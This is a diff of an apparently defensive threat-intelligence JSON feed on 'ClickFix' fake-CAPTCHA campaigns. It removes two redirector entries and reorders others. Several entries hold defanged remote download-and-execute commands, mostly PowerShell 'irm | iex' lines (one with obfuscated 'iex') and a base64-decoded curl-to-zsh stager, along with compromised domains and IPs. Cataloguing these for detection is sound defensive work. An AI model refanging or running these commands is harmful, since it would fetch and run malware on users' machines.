@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 6325,
+ "count": 6323,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -105455,56 +105455,6 @@
    ],
    "connects_to": [],
    "lure_from": []
-  },
-  {
-   "indicator": "edu.hu",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-15",
-   "last_seen": "2026-11-15",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://veresegyhazegymi.edu.hu/",
-   "brand": null,
-   "product": null,
-   "hosting": "AS WebSupport s.r.o.",
-   "dns": "hbone.hu",
-   "ip": "185.111.89.204",
-   "asn": "AS51013",
-   "org": "WEBSUPPORT-SRO-SK-AS WebSupport s.r.o., SK",
-   "country": "HU",
-   "ips": [
-    {
-     "ip": "185.111.89.204",
-     "asn": "AS51013",
-     "org": "WEBSUPPORT-SRO-SK-AS WebSupport s.r.o., SK",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-15"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "veresegyhazegymi.edu.hu",
-     "status": "online",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-15"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
-   ],
-   "connects_to": [
-    "github.pw"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "eduardoalcivar.com",
@@ -279878,13 +279828,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//holodeo[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//holodeo[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
     "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
-    "holodeo.net",
     "j7tracker.gb.net",
+    "holodeo.net",
     "github.pw"
    ],
    "lure_from": [
@@ -283560,10 +283510,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/dan_proliv/[id]')|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw",
     "xorados.com",
     "trek-72.com"
@@ -304675,56 +304627,6 @@
     "browse-login.info"
    ],
    "lure_from": []
-  },
-  {
-   "indicator": "thefreedomcollective.org",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-15",
-   "last_seen": "2026-11-17",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://thefreedomcollective.org/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "GoDaddy",
-   "ip": "141.193.213.10",
-   "asn": "AS209242",
-   "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "141.193.213.10",
-     "asn": "AS209242",
-     "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-17"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "thefreedomcollective.org",
-     "status": "online",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-17"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
-   ],
-   "connects_to": [
-    "lepafonso.bz"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "theglorius.com",
